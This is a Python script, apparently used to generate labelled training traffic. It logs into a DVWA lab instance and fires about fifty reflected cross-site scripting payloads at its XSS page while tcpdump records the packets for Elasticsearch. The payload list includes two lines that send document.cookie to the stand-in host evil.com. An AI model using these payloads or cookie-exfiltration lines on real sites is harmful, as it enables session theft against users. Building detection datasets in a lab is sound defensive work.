import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS XSS ENTRENAMIENTO
# =============================================

PAYLOADS_XSS = [
    "<script>alert('xss')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<script>document.cookie</script>",
    "<script>alert(document.domain)</script>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<script>alert('XSS')</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<div style=\"background:url(javascript:alert(1))\">",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    "<script>alert`1`</script>",
    "<script>alert(1337)</script>",
    "<img/src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<script>new Image().src='http://evil.com?c='+document.cookie</script>",
    "<script>alert(2)</script>",
    "<script>alert(3)</script>",
    "<img src=y onerror=alert(1)>",
    "<svg onload=alert(2)>",
    "<body onload=alert(2)>",
    "<input autofocus onfocus=alert(2)>",
    "<script>console.log(document.cookie)</script>",
    "<script>alert(window.location)</script>",
    "<script>alert(navigator.userAgent)</script>",
    "<script>alert(document.title)</script>",
    "<iframe onload=alert(1)>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss(session):
    print("\n[*] Iniciando ataques XSS Reflected...")
    payloads = PAYLOADS_XSS.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: XSS REFLECTED")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'xss'")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_xss(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'xss'")
    print("="*60)
